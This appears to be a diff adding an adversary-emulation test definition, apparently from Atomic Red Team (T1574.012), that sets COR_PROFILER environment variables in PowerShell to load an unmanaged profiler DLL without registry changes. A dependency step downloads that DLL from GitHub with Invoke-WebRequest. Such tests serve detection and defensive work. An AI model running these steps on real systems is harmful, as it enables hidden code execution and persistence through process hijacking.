@@ -1,0 +1,111 @@
+{
+  "id": "79d57242-bbef-41db-b301-9d01d9f6e817",
+  "name": "Registry-free process scope COR_PROFILER",
+  "description": "Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.\n\nReference: https://redcanary.com/blog/cor_profiler-for-persistence/\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "7064dd06-09bc-4530-a650-bcce62c32dc2",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:COR_ENABLE_PROFILING = 1\n$env:COR_PROFILER = '#{clsid_guid}'\n$env:COR_PROFILER_PATH = '\"#{file_name}\"'\nPOWERSHELL -c 'Start-Sleep 1'\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8e28642e-0e49-417b-af08-059343a6a495",
+      "type": "execute-command",
+      "data": {
+        "command": "$env:COR_ENABLE_PROFILING = 0\n$env:COR_PROFILER = ''\n$env:COR_PROFILER_PATH = ''\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "c9caf465-e1f7-490d-a165-c5f3a72b439c",
+      "name": "Check dependency 1/1",
+      "description": "\"#{file_name}\" must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "31153bc7-6223-4b1e-a559-8c3d147a71f8",
+      "name": "Resolve dependency 1/1",
+      "description": "\"#{file_name}\" must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "New-Item -Type Directory (split-path \"#{file_name}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll\" -OutFile \"#{file_name}\"\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "3910fa59-8515-45c3-94da-95887f145eab",
+      "name": "Re-check dependency 1/1",
+      "description": "\"#{file_name}\" must be present\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if (Test-Path \"#{file_name}\") {exit 0} else {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "7064dd06-09bc-4530-a650-bcce62c32dc2",
+      "p": "on-success",
+      "o": "8e28642e-0e49-417b-af08-059343a6a495"
+    },
+    {
+      "s": "7064dd06-09bc-4530-a650-bcce62c32dc2",
+      "p": "on-failure",
+      "o": "8e28642e-0e49-417b-af08-059343a6a495"
+    },
+    {
+      "s": "c9caf465-e1f7-490d-a165-c5f3a72b439c",
+      "p": "on-success",
+      "o": "7064dd06-09bc-4530-a650-bcce62c32dc2"
+    },
+    {
+      "s": "c9caf465-e1f7-490d-a165-c5f3a72b439c",
+      "p": "on-failure",
+      "o": "31153bc7-6223-4b1e-a559-8c3d147a71f8"
+    },
+    {
+      "s": "31153bc7-6223-4b1e-a559-8c3d147a71f8",
+      "p": "on-success",
+      "o": "3910fa59-8515-45c3-94da-95887f145eab"
+    },
+    {
+      "s": "3910fa59-8515-45c3-94da-95887f145eab",
+      "p": "on-failure",
+      "o": "7064dd06-09bc-4530-a650-bcce62c32dc2"
+    }
+  ],
+  "tags": [
+    "T1574.012",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "file_name",
+      "type": "path",
+      "description": "unamanged profiler DLL",
+      "value": "PathToAtomicsFolder\\T1574.012\\bin\\T1574.012x64.dll"
+    },
+    {
+      "name": "clsid_guid",
+      "type": "string",
+      "description": "custom clsid guid",
+      "value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+    }
+  ]
+}
